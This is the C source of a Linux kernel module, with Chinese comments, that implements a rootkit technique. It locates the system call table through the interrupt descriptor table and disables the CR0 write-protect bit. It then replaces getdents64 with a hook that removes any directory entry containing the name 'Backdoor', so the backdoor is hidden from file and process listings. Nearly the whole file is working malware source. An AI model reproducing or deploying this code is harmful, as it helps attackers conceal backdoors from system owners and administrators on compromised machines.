#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
//struct file 和 struct file_operations都在/include/linux/fs.h中定义
//#include <sys/stat.h>
//#include <fcntl.h>
#define CALLOFF 100


int orig_cr0;

char psname[10]="Backdoor";
char *processname=psname;


struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) * idt;
//define idtr和idt的结构
// struct linux_dirent 
// {
//     unsigned long  d_ino;     /* Inode number */
//     unsigned long  d_off;     /* Offset to next linux_dirent */
//     unsigned short d_reclen;  /* Length of this linux_dirent */
//     char           d_name[];  /* Filename (null-terminated) */
//     /* length is actually (d_reclen - 2 - offsetof(struct linux_dirent, d_name)) */
//     /*
//     char           pad;       // Zero padding byte
//     char           d_type;    // File type (only since Linux 
//                               // 2.6.4); offset is (d_reclen - 1)
//     */
// }
asmlinkage long (*orig_getdents64)(unsigned int fd,struct linux_dirent64 __user *dirp, unsigned int count);
void** sys_call_table;

unsigned int clear_and_return_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;

    asm volatile ("movl %%cr0, %%eax"
            : "=a"(cr0)
         );
    ret = cr0;

    /*clear the 20th bit of CR0,*/
    cr0 &= 0xfffeffff;
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(cr0)
         );
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(val)
         );
}




char * findoffset(char *start)
{
    char *p;
    for (p = start; p < start + CALLOFF; p++)
    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')
        return p;
    return NULL;
}



asmlinkage long hacked_getdents64(unsigned int fd,
                    struct linux_dirent64 __user *dirp, unsigned int count)
{
    //the number of bytes read is returned
    long value;
    unsigned short len = 0;
    unsigned short tlen = 0;

    value = (*orig_getdents64) (fd, dirp, count);
    //把读到的文件结构写入dirp中,drip是该是别的函数传入的，通过drip把结果返回给调用者
    tlen = value;
    while(tlen > 0)
    {
        len = dirp->d_reclen;
        tlen = tlen - len;
        //剩余多少byte
        printk("%s\n",dirp->d_name);
        //dirp->name是一个绝对路径名                
        if(strstr(dirp->d_name,processname) )
        {
            //如果绝对路径名中包含我们的文件名
            printk("find process\n");
            memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
            //如果目标区域和源区域有重叠的话，memmove能够保证源串在被覆盖之前将重叠区域的字节拷贝到目标区域中。
            //本例中明显有重叠，所以用memmove，如果没有重叠直接用memcoy
            value = value - len;
            //对函数的结果做出修改
            printk(KERN_INFO "hide successful.\n");
        }
        else
        {
	       if(tlen)
                dirp = (struct linux_dirent *) ((char *)dirp + dirp->d_reclen);
                //对dirp指针做出修改，使其指向下一个文件
        }
    }
        printk(KERN_INFO "finished hacked_getdents64.\n");
        return value;
}


void **get_sct_addr(void)
{
    unsigned sys_call_off;
    unsigned sct = 0;
    char *p;
    asm("sidt %0":"=m"(idtr));
    idt = (void *) (idtr.base + 8 * 0x80);
    sys_call_off = (idt->off2 << 16) | idt->off1;
    if ((p = findoffset((char *) sys_call_off)))
        sct = *(unsigned *) (p + 3);
    return ((void **)sct);
}


static int filter_init(void)
{
    sys_call_table = get_sct_addr();
    if (!sys_call_table)
    {
        printk("get_sct_addr(): NULL...\n");
        return 0;
    }
    else
        printk("sct: 0x%x\n\n\n\n\n\n", (unsigned int)sys_call_table);
    orig_getdents64 = sys_call_table[__NR_getdents64];
	printk("offset: 0x%x\n\n\n\n",(unsigned int)orig_getdents64);
    orig_cr0 = clear_and_return_cr0();
    sys_call_table[__NR_getdents64] = hacked_getdents64;
    printk("hacked_getdents64: 0x%x\n\n\n\n",(unsigned int)hacked_getdents64);
    setback_cr0(orig_cr0);

    printk(KERN_INFO "hidels: module loaded.\n");
                return 0;
}


static void filter_exit(void)
{
    orig_cr0 = clear_and_return_cr0();
    if (sys_call_table)
    sys_call_table[__NR_getdents64] = orig_getdents64;
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hidels: module removed\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
